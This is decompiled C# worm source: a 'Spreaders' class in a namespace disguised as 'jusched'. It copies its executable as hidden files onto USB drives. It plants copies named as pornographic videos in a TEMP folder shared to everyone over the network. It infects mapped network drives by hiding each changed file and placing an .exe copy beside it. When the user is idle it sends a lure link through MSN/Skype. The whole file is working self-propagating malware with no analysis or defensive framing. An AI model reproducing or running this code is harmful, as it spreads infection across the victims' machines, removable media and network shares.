using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace jusched;

public class Spreaders
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	public static Thread spread_0 = new Thread(delegate(object a0)
	{
		usb_0(Conversions.ToString(a0));
	});

	[AccessedThroughProperty("myTimer")]
	private static Timer _myTimer;

	private static cIdleTimeStool _inactiveTimeRetriever;

	private static Timer myTimer
	{
		[DebuggerNonUserCode]
		get
		{
			return _myTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = InactivityTimer_Tick;
			if (_myTimer != null)
			{
				_myTimer.remove_Tick(eventHandler);
			}
			_myTimer = value;
			if (_myTimer != null)
			{
				_myTimer.add_Tick(eventHandler);
			}
		}
	} = new Timer();


	[DebuggerNonUserCode]
	public Spreaders()
	{
		__ENCAddToList(this);
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	public static void runonce_0()
	{
		try
		{
			lan_0();
			laninfect();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static object dl(string url, string filename)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		byte[] bytes = webClient.DownloadData(url);
		File.WriteAllBytes(filename, bytes);
		object result = default(object);
		return result;
	}

	public static void usb_0(string filename)
	{
		while (true)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					if (!driveInfo.IsReady || driveInfo.DriveType != DriveType.Removable || 1 == 0)
					{
						continue;
					}
					string text = driveInfo.RootDirectory.ToString();
					string path = text + filename + ".exe";
					try
					{
						if (File.Exists(path))
						{
							File.Delete(path);
						}
						File.Copy(Application.get_ExecutablePath(), text + filename + ".exe");
						File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					if (Directory.Exists(text))
					{
						try
						{
							Watcher.sourceunit = text;
							Watcher.Run();
							Thread.Sleep(300000);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void lan_0()
	{
		string text = Environment.GetEnvironmentVariable("TEMP") + "\\" + Configuration.lanfolder + "\\";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string[] c = new string[4] { "Arrecha recibe por el culo.avi", "Dandome una rica mamada.avi", "Culona haciendo la licuadora.flv", "El culo redondito de mi jerma.mp4" };
			ArrayList arrayList = new ArrayList(c);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = arrayList.GetEnumerator();
				while (enumerator.MoveNext())
				{
					string text2 = Conversions.ToString(enumerator.Current);
					File.Copy(Application.get_ExecutablePath(), text + text2 + ".exe");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			Interaction.Shell("NET SHARE \"videos cholotube=" + text + "\" /GRANT:Todos,FULL", (AppWinStyle)0, false, -1);
			Interaction.Shell("NET SHARE \"videos cholotube=" + text + "\" /GRANT:everyone,FULL", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void laninfect()
	{
		try
		{
			RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text in valueNames)
			{
				string text2 = registryKey.GetValue(text)!.ToString() + "\\";
				if (Operators.CompareString(text.ToLower(), "mrulist", false) != 0 && Directory.Exists(text2))
				{
					Run(text2);
				}
			}
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void Run(string boom)
	{
		FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
		fileSystemWatcher.Path = boom;
		fileSystemWatcher.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName | NotifyFilters.LastWrite | NotifyFilters.LastAccess;
		fileSystemWatcher.Filter = "*.*";
		fileSystemWatcher.Changed += OnChanged;
		fileSystemWatcher.Created += OnChanged;
		fileSystemWatcher.Deleted += OnChanged;
		fileSystemWatcher.EnableRaisingEvents = true;
	}

	private static void OnChanged(object sender, FileSystemEventArgs e)
	{
		string fullPath = e.FullPath;
		File.SetAttributes(fullPath, FileAttributes.Hidden);
		File.Copy(Application.get_ExecutablePath(), fullPath + ".exe");
	}

	public static void start_id()
	{
		_inactiveTimeRetriever = new cIdleTimeStool();
		myTimer.Start();
	}

	private static void InactivityTimer_Tick(object sender, EventArgs e)
	{
		TimeSpan? inactiveTime = _inactiveTimeRetriever.GetInactiveTime();
		if (inactiveTime.HasValue && inactiveTime.Value.TotalSeconds > 60.0)
		{
			DoSomething();
			SkypeSP.NICE();
		}
	}

	private static void DoSomething()
	{
		Msnspread.MYmessage = "oye te acuerdas de esta foto http://goo.gl/0xEnm ?";
		Msnspread.MsnStart();
		myTimer.set_Interval(1800000);
	}
}
